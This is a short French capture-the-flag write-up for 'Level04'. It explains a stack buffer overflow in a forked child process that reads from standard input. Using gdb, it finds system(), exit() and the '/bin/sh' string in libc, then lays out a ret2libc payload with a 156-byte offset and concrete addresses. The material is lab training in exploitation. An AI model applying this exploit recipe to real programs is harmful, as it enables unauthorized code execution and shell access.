## Level04

![image](https://user-images.githubusercontent.com/29956389/95228349-80916800-07ff-11eb-9dad-f6d64850fcc5.png)

Dans le code du binaire on observe un appel a `fork()`.

Le processus fils lit sur l'entrée standart. Essayons de le faire overflow:

![image](https://user-images.githubusercontent.com/29956389/95228737-feee0a00-07ff-11eb-98ef-9157a7ad463f.png)

On écrase l'eip a l'offset 156.

Essayons donc une attaque ret2libc:


```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

```
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
```

```
(gdb) p exit
$3 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```

Notre exploit est donc composé de :

`[ buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse exit() ] [ Adresse "/bin/sh" ]`

ou 

`[ 156 bytes ] [ 0xf7e6aed0 ] [ 0xf7e5eb70 ] [ 0xf7f897ec ]`

![image](https://user-images.githubusercontent.com/29956389/95229263-a703d300-0800-11eb-81ff-16582f063481.png)
